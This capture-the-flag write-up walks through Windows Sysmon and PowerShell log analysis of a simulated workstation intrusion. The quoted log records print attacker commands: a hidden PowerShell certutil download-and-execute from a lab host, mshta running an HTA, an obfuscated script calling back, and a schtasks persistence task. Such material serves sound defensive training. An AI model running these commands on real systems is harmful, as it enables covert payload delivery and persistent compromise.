# Handbook for the Recently Compromised

|  Category  |Difficulty|
|:----------:|:--------:|
|Log Analysis|   Easy   |

**Skills learned:**
* Dumping the contents of Windows Event Logs (.evtx) files and converting them into .json format
* Analyzing *Microsoft-Windows-Sysmon Operational* and *PowerShell-Operational* logs to reconstruct the timeline of an attack
* Mapping observed adversary behavior to MITRE ATT&CK techniques

## Mission
A Windows workstation has been flagged for unusual activity. Examine its event logs, follow the sequence of suspicious actions, and piece together how the host was compromised. 
You have been given Windows event logs collected from a workstation under investigation. Review the recorded activity, identify the events associated with the intrusion, and build a timeline that explains what the attacker did on the host.

**File attachment(s):**
```text
artifacts
├── tools
│   ├── attack-reference
│   │   ├── LICENSE.txt
│   │   ├── enterprise-attack.json
│   │   └── enterprise-techniques.tsv
│   ├── Licenses (folder)
│   └── evtx_dump (exe)
├── Microsoft-Windows-Sysmon Operational.evtx
└── PowerShell-Operational.evtx 
```

## Objectives
* Identify the earliest evidence of suspicious activity
* Connect related events and reconstruct the attack timeline
* Link the observed actions to relevant MITRE ATT&CK techniques
* Establish what the attacker achieved on the workstation

## Analyst Note
Start with the timestamps, then compare the accounts, processes, and commands involved. An isolated event may look ordinary; the events around it can tell a different story.

## Dumping Contents of .evtx Files
In order to read the .evtx files on the room's lab machine, we have to first utilize **evtx_dump** to convert the files into a readable format for Linux.

The full usage of evtx_dump can be found on [GitHub](https://github.com/omerbenamram/EVTX). The full commands I used are below:

`evtx_dump /home/ubuntu/Desktop/artifacts/Microsoft-Windows-Sysmon%4Operational.evtx --format json --output Sysmon.json` → creates a file named **Sysmon.json** having the contents of Sysmon logs

`evtx_dump /home/ubuntu/Desktop/artifacts/PowerShell-Operational.evtx --format json --output PowerShell.json` → creates a file named **PowerShell.json** having the contents of the PowerShell logs

Now we can open our artifact files *Sysmon.json* and *PowerShell.json* for analysis.

## Questions
**1. A trusted Windows utility downloaded a second-stage script onto the host. The command that called the utility obscured its name with a wildcard. What is the utility’s full executable name?**

Inside the Sysmon logs, we can see the command calling an obscured utility name *certu*.exe* in the **CommandLine** field:
```
Record 34
{"Event":{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-Sysmon","Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9"}},"EventID":1,"Version":5,"Level":4,"Task":1,"Opcode":0,"Keywords":"0x8000000000000000","TimeCreated":{"#attributes":{"SystemTime":"2026-10-02T05:02:05.481301Z"}},"EventRecordID":392,"Correlation":null,"Execution":{"#attributes":{"ProcessID":1500,"ThreadID":1988}},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"THM-JCOLLINS","Security":{"#attributes":{"UserID":"S-1-5-18"}}},"EventData":{"RuleName":"-","UtcTime":"2026-10-02 05:02:05.480","ProcessGuid":"F391FD9B-3ACD-6ABF-1A06-000000000300","ProcessId":2052,"Image":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","FileVersion":"10.0.19041.546 (WinBuild.160101.0800)","Description":"Windows PowerShell","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"PowerShell.EXE","CommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"& ((gci C:\\Windows\\System32\\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\\pipeline-sync.ps1; powershell -ep bypass -f $env:TEMP\\pipeline-sync.ps1\"","CurrentDirectory":"C:\\Users\\j.collins\\Downloads\\","User":"THM-JCOLLINS\\j.collins","LogonGuid":"F391FD9B-6E74-6ABE-902D-030000000000","LogonId":"0x32d90","TerminalSessionId":1,"IntegrityLevel":"Medium","Hashes":"MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667","ParentProcessGuid":"F391FD9B-3ACD-6ABF-1906-000000000300","ParentProcessId":6052,"ParentImage":"C:\\Windows\\SysWOW64\\mshta.exe","ParentCommandLine":"\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\j.collins\\Downloads\\pipeline-check.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} ","ParentUser":"THM-JCOLLINS\\j.collins"}}}
```

Two log entries later, we can see the full name of the utility executed in the **Image** field:
```
Record 36
{"Event":{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-Sysmon","Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9"}},"EventID":1,"Version":5,"Level":4,"Task":1,"Opcode":0,"Keywords":"0x8000000000000000","TimeCreated":{"#attributes":{"SystemTime":"2026-10-02T05:02:06.831551Z"}},"EventRecordID":394,"Correlation":null,"Execution":{"#attributes":{"ProcessID":1500,"ThreadID":1988}},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"THM-JCOLLINS","Security":{"#attributes":{"UserID":"S-1-5-18"}}},"EventData":{"RuleName":"-","UtcTime":"2026-10-02 05:02:06.830","ProcessGuid":"F391FD9B-3ACE-6ABF-1C06-000000000300","ProcessId":5032,"Image":"C:\\Windows\\SysWOW64\\certutil.exe","FileVersion":"10.0.19041.1466 (WinBuild.160101.0800)","Description":"CertUtil.exe","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"CertUtil.exe","CommandLine":"\"C:\\Windows\\System32\\certutil.exe\" -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 C:\\Users\\J1B0B~1.COL\\AppData\\Local\\Temp\\pipeline-sync.ps1","CurrentDirectory":"C:\\Users\\j.collins\\Downloads\\","User":"THM-JCOLLINS\\j.collins","LogonGuid":"F391FD9B-6E74-6ABE-902D-030000000000","LogonId":"0x32d90","TerminalSessionId":1,"IntegrityLevel":"Medium","Hashes":"MD5=0DDA4F16AE041578B4E250AE12E06EB1,SHA256=E4666C8042C0499DA4CAF84EA2D3C61346F91D3DF5D4CD40834C736BD9C65B35,IMPHASH=92EAFDFBCF8B4ECD46E832973B0649D6","ParentProcessGuid":"F391FD9B-3ACD-6ABF-1A06-000000000300","ParentProcessId":2052,"ParentImage":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"& ((gci C:\\Windows\\System32\\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\\pipeline-sync.ps1; powershell -ep bypass -f $env:TEMP\\pipeline-sync.ps1\"","ParentUser":"THM-JCOLLINS\\j.collins"}}}
```

**Answer: certutil.exe**

---

**2. What full URL did the utility retrieve the second-stage script from?**

In the same Sysmon logs *records 34 & 36*, we can see the full command executed in the **CommandLine** field, which includes the full URL where the second-stage script was downloaded from:
```
"CommandLine":"\"C:\\Windows\\System32\\certutil.exe\" -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 C:\\Users\\J1B0B~1.COL\\AppData\\Local\\Temp\\pipeline-sync.ps1"
```

**Answer: http://pipeline-cdn.thm:8088/pipeline-sync.ps1**

---

**3. Which MITRE ATT&CK sub-technique describes the abuse of the Windows scripting host that executed the initial attachment?**

In Sysmon log *record 33*, we can find the tool that executed the initial attachment *C:\\Users\\j.collins\\Downloads\\pipeline-check.hta* in the **Image** field:
```
Record 33
{"Event":{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-Sysmon","Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9"}},"EventID":1,"Version":5,"Level":4,"Task":1,"Opcode":0,"Keywords":"0x8000000000000000","TimeCreated":{"#attributes":{"SystemTime":"2026-10-02T05:02:05.239631Z"}},"EventRecordID":391,"Correlation":null,"Execution":{"#attributes":{"ProcessID":1500,"ThreadID":1988}},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"THM-JCOLLINS","Security":{"#attributes":{"UserID":"S-1-5-18"}}},"EventData":{"RuleName":"-","UtcTime":"2026-10-02 05:02:05.238","ProcessGuid":"F391FD9B-3ACD-6ABF-1906-000000000300","ProcessId":6052,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","FileVersion":"11.00.19041.1 (WinBuild.160101.0800)","Description":"Microsoft (R) HTML Application host","Product":"Internet Explorer","Company":"Microsoft Corporation","OriginalFileName":"MSHTA.EXE","CommandLine":"\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\j.collins\\Downloads\\pipeline-check.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} ","CurrentDirectory":"C:\\Users\\j.collins\\Downloads\\","User":"THM-JCOLLINS\\j.collins","LogonGuid":"F391FD9B-6E74-6ABE-902D-030000000000","LogonId":"0x32d90","TerminalSessionId":1,"IntegrityLevel":"Medium","Hashes":"MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F","ParentProcessGuid":"F391FD9B-6E75-6ABE-5500-000000000300","ParentProcessId":4408,"ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"C:\\Windows\\Explorer.EXE","ParentUser":"THM-JCOLLINS\\j.collins"}}}
```

The scripting host *mshta.exe* was abused to execute a malicious .hta file. [MITRE ATT&CK](https://attack.mitre.org/techniques/T1218/005/) maps this activity to **System Binary Proxy Execution: Mshta T1218.005**.

**Answer: T1218.005**

---

**4. Which MITRE ATT&CK sub-technique describes the persistence mechanism the intruder configured?**

Further examining the Sysmon logs, we find the persistence mechanism in *record 41*:
```
Record 41
{"Event":{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-Sysmon","Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9"}},"EventID":1,"Version":5,"Level":4,"Task":1,"Opcode":0,"Keywords":"0x8000000000000000","TimeCreated":{"#attributes":{"SystemTime":"2026-10-02T05:02:08.210969Z"}},"EventRecordID":399,"Correlation":null,"Execution":{"#attributes":{"ProcessID":1500,"ThreadID":1988}},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"THM-JCOLLINS","Security":{"#attributes":{"UserID":"S-1-5-18"}}},"EventData":{"RuleName":"-","UtcTime":"2026-10-02 05:02:08.209","ProcessGuid":"F391FD9B-3AD0-6ABF-1E06-000000000300","ProcessId":5800,"Image":"C:\\Windows\\SysWOW64\\schtasks.exe","FileVersion":"10.0.19041.1503 (WinBuild.160101.0800)","Description":"Task Scheduler Configuration Tool","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"schtasks.exe","CommandLine":"\"C:\\Windows\\system32\\schtasks.exe\" /create /tn StudioPipelineSync /tr \"powershell -nop -w hidden -f C:\\Users\\j.collins\\AppData\\Roaming\\PipelineSync\\pipeline-sync.ps1\" /sc onlogon /rl highest /f","CurrentDirectory":"C:\\Users\\j.collins\\Downloads\\","User":"THM-JCOLLINS\\j.collins","LogonGuid":"F391FD9B-6E74-6ABE-902D-030000000000","LogonId":"0x32d90","TerminalSessionId":1,"IntegrityLevel":"Medium","Hashes":"MD5=48C2FE20575769DE916F48EF0676A965,SHA256=ABCD98A854E034F464DB23A8954208B52A6FD15E6F94B8593004E7932E8F3CFC,IMPHASH=918DBB01101BFA7F1042CCA9520D2A05","ParentProcessGuid":"F391FD9B-3ACE-6ABF-1D06-000000000300","ParentProcessId":1776,"ParentImage":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ep bypass -f C:\\Users\\J1B0B~1.COL\\AppData\\Local\\Temp\\pipeline-sync.ps1","ParentUser":"THM-JCOLLINS\\j.collins"}}}
```

The attacker used *Task Scheduler* to create a scheduled task named **StudioPipelineSync**. [MITRE ATT&CK](https://attack.mitre.org/techniques/T1053/005/) maps this activity to **Scheduled Task/Job: Scheduled Task T1053.005**.

**Answer: T1053.005**

---

**5. What is the flag?**

The flag can be found in the *PowerShell* log, where the malicious .ps1 file **pipeline-sync.ps1** was executed:
```
{"Event":{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"System":{"Provider":{"#attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"}},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated":{"#attributes":{"SystemTime":"2026-10-02T05:02:07.744314Z"}},"EventRecordID":222,"Correlation":{"#attributes":{"ActivityID":"54CCF93D-51B1-0006-5470-CD54B151DD01"}},"Execution":{"#attributes":{"ProcessID":1776,"ThreadID":1596}},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"THM-JCOLLINS","Security":{"#attributes":{"UserID":"S-1-5-21-414436941-4170051349-3023557195-1000"}}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"try { Invoke-WebRequest -Uri (-join('htt','p://pip','el','ine','-cdn.th','m:','808','8/check','in')) -UseBasicParsing -TimeoutSec 3 | Out-Null } catch {}\nschtasks /create /tn ('S'+'tu'+'dioPi'+'pe'+'li'+'neSyn'+'c') /tr (-join('pow','e','rshe','l','l -nop',' -','w hi','dden -','f C:\\U','se','rs\\j','.','collins','\\AppDat','a\\Roamin','g\\Pipeli','neSyn','c\\','pi','pelin','e-sync','.p','s','1')) /sc onlogon /rl highest /f\n$blob = ('VEhNe3R'+'IM19Ha'+'D'+'BzdF93MX'+'RIX1Ro'+'M19'+'NMDVUfQ='+'=')\n$flag = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob))\n$dir = ($env:TEMP + ('\\Pipe'+'lineS'+'ync'))\nNew-Item $dir -ItemType Directory -Force | Out-Null\nSet-Content ($dir + ('\\.sy'+'nc-c'+'ach'+'e')) $flag\r\n","ScriptBlockId":"2b2a68a0-ea6a-43f8-b971-4b2db58eeff6","Path":"C:\\Users\\j.collins\\AppData\\Local\\Temp\\pipeline-sync.ps1"}}}
```

The PowerShell file contains an encoded flag, as well as the algorithm used to encode it:
* $blob = ('VEhNe3R'+'IM19Ha'+'D'+'BzdF93MX'+'RIX1Ro'+'M19'+'NMDVUfQ='+'=')
* $flag = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob))

All we have to do is take the encoded string **VEhNe3RIM19HaDBzdF93MXRIX1RoM19NMDVUfQ==** and do *from Base64* decoding.

**Answer: THM{tH3_Gh0st_\*\*\*\*_\*\*\*_\*\*\*\*}**